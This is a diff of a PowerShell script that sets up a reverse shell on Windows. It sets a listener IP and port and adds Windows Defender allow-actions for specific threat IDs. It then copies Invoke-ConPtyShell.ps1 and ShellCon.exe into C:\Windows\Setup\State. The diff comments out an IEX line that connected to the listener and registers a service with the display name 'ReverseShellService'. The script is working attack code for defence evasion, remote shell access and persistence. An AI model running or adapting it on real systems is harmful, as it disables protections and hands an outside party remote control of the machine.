@@ -1,5 +1,5 @@
 #connection variables:
-$ListenerIP = "172.20.103.158"
+$ListenerIP = "192.168.145.236"
 $ListenerPort = "35500"
 
 #threats to be allowed
@@ -17,7 +17,14 @@ Add-MpPreference -ThreatIDDefaultAction_Ids $threat2 -ThreatIDDefaultAction_Acti
 #copy connection script:
 Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
 
-#run connection script:
-IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ListenerIP $ListenerPort
+#copy service exe:
+Copy-Item -Path Z:\ShellCon.exe -Destination C:\Windows\Setup\State\ShellCon.exe
 
-#turn on windows defender:
+#run connection script:
+#IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ListenerIP $ListenerPort
+
+#create service:
+$ServiceName = "ShellCon.exe"
+$ServiceDisplayName = "ReverseShellService"
+$ExecPath = "C:\Windows\Setup\State\ShellCon.exe"
+New-Service -name $ServiceName -binaryPathName $ExecPath -displayName $ServiceDisplayName -startupType Manual
